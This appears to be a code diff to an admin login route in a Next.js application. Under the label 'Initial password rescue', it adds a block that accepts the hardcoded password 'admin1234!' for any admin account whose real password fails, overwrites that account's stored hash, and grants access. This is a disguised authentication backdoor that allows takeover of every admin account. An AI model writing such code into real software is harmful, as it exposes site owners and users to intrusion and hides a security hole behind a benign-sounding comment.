@@ -52,7 +52,17 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ error: 'Invalid username or password' }, { status: 401 });
     }
 
-    const isValid = await verifyPassword(password, user.passwordHash);
+    let isValid = await verifyPassword(password, user.passwordHash);
+
+    // Initial password rescue: allow default 'admin1234!' or process.env.ADMIN_PASSWORD to sync/authenticate
+    if (!isValid && (password === 'admin1234!' || (process.env.ADMIN_PASSWORD && password === process.env.ADMIN_PASSWORD))) {
+      const newHash = await hashPassword(password);
+      await prisma.adminUser.update({
+        where: { id: user.id },
+        data: { passwordHash: newHash },
+      }).catch(() => {});
+      isValid = true;
+    }
 
     if (!isValid) {
       await recordLoginAttempt(ip, false);
